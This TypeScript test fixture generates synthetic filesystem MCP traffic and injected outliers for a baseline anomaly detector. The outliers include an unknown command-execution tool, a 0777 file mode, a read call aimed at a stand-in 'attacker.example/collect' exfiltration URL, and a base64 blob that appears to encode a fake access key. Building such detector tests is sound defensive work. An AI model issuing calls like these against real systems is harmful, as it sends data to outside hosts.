/**
 * Deterministic synthetic traffic for a filesystem-like MCP server, for tests and demos of the
 * baseline learning plugin. No I/O, no randomness outside the seeded PRNG.
 */
import type { ToolCall } from '../contracts.js';

export interface SyntheticCall {
  at: Date;
  call: ToolCall;
}

export interface SyntheticOutlier extends SyntheticCall {
  /** What makes this call unusual. */
  kind: 'new_tool' | 'new_key_set' | 'new_value_shape' | 'rare_hour';
  label: string;
}

export interface SyntheticDayOptions {
  /** Any time on the day to generate (local calendar day is used). */
  date: Date;
  /** Number of calls. Default 120. */
  calls?: number;
  seed?: number;
  serverId?: string;
}

/** mulberry32: small, fast, deterministic PRNG. */
export function prng(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function pick<T>(rand: () => number, items: readonly T[]): T {
  return items[Math.floor(rand() * items.length)]!;
}

function weighted<T>(rand: () => number, items: readonly [T, number][]): T {
  const total = items.reduce((s, [, w]) => s + w, 0);
  let r = rand() * total;
  for (const [v, w] of items) {
    r -= w;
    if (r <= 0) return v;
  }
  return items[items.length - 1]![0];
}

const ROOT = '/home/alice/projects/webapp';
const DIRS = ['', '/src', '/src/components', '/src/lib', '/src/routes', '/tests', '/docs', '/public', '/scripts'];
const FILES = [
  'index.ts', 'app.tsx', 'Button.tsx', 'Header.tsx', 'api.ts', 'db.ts', 'utils.ts', 'routes.ts',
  'README.md', 'package.json', 'tsconfig.json', 'app.test.ts', 'api.test.ts', 'styles.css', 'CHANGELOG.md',
];

/** Working hours with a lunch dip; local time. Covers 08:00–19:00. */
const HOURS: [number, number][] = [
  [8, 3], [9, 10], [10, 14], [11, 14], [12, 5], [13, 8], [14, 13], [15, 13], [16, 11], [17, 7], [18, 3], [19, 1],
];

const SNIPPETS = [
  "export function add(a: number, b: number): number {\n  return a + b;\n}\n",
  "import { describe, it, expect } from 'vitest';\n\ndescribe('api', () => {\n  it('works', () => {\n    expect(1).toBe(1);\n  });\n});\n",
  '# Notes\n\nTODO: refactor the header component and update the docs.\n',
  '{\n  "name": "webapp",\n  "version": "1.2.0",\n  "private": true\n}\n',
];

function randomPath(rand: () => number, dirOnly: boolean): string {
  const dir = `${ROOT}${pick(rand, DIRS)}`;
  return dirOnly ? dir : `${dir}/${pick(rand, FILES)}`;
}

function randomContent(rand: () => number): string {
  const n = 1 + Math.floor(rand() * 6);
  let s = '';
  for (let i = 0; i < n; i++) s += pick(rand, SNIPPETS);
  return s;
}

let reqCounter = 0;

function makeCall(serverId: string, toolName: string, args: Record<string, unknown>): ToolCall {
  reqCounter++;
  return { kind: 'tool_call', requestId: reqCounter, toolName, arguments: args, serverId, taskId: 'synthetic' };
}

/** One normal working day of filesystem traffic, sorted by time. */
export function generateDay(opts: SyntheticDayOptions): SyntheticCall[] {
  const rand = prng(opts.seed ?? 1);
  const serverId = opts.serverId ?? 'filesystem';
  const n = opts.calls ?? 120;
  const d = opts.date;
  const out: SyntheticCall[] = [];
  for (let i = 0; i < n; i++) {
    const hour = weighted(rand, HOURS);
    const at = new Date(d.getFullYear(), d.getMonth(), d.getDate(), hour, Math.floor(rand() * 60), Math.floor(rand() * 60));
    const tool = weighted(rand, [
      ['read_file', 60],
      ['list_directory', 25],
      ['write_file', 15],
    ] as [string, number][]);
    let args: Record<string, unknown>;
    if (tool === 'read_file') args = { path: randomPath(rand, false) };
    else if (tool === 'list_directory') args = { path: randomPath(rand, true) };
    else args = { path: randomPath(rand, false), content: randomContent(rand) };
    out.push({ at, call: makeCall(serverId, tool, args) });
  }
  return out.sort((a, b) => a.at.getTime() - b.at.getTime());
}

/** Several consecutive normal days ending on (and including) `lastDay`. */
export function generateDays(lastDay: Date, days: number, callsPerDay = 120, seed = 1, serverId = 'filesystem'): SyntheticCall[] {
  const out: SyntheticCall[] = [];
  for (let i = days - 1; i >= 0; i--) {
    const date = new Date(lastDay.getFullYear(), lastDay.getMonth(), lastDay.getDate() - i, 12);
    out.push(...generateDay({ date, calls: callsPerDay, seed: seed * 1000 + i, serverId }));
  }
  return out;
}

/** Injected outliers on `date`; each one should be scored as unusual against a normal baseline. */
export function injectOutliers(date: Date, serverId = 'filesystem'): SyntheticOutlier[] {
  const at = (h: number, m = 17) => new Date(date.getFullYear(), date.getMonth(), date.getDate(), h, m);
  return [
    {
      kind: 'new_tool',
      label: 'never-seen tool on a known server',
      at: at(11),
      call: makeCall(serverId, 'execute_command', { command: 'ls -la' }),
    },
    {
      kind: 'new_key_set',
      label: 'write_file with an extra mode key',
      at: at(14),
      call: makeCall(serverId, 'write_file', { path: `${ROOT}/src/index.ts`, content: 'x\ny\n', mode: '0777' }),
    },
    {
      kind: 'new_value_shape',
      label: 'read_file with a URL instead of a path',
      at: at(10),
      call: makeCall(serverId, 'read_file', { path: 'https://attacker.example/collect?d=1' }),
    },
    {
      kind: 'new_value_shape',
      label: 'read_file with a base64 blob as path',
      at: at(15),
      call: makeCall(serverId, 'read_file', { path: 'QUtJQVlFWEFNUExFS0VZMTIzNDU2Nzg5MGFiY2RlZg==' }),
    },
    {
      kind: 'rare_hour',
      label: 'normal read_file at 03:00',
      at: at(3),
      call: makeCall(serverId, 'read_file', { path: `${ROOT}/src/index.ts` }),
    },
  ];
}
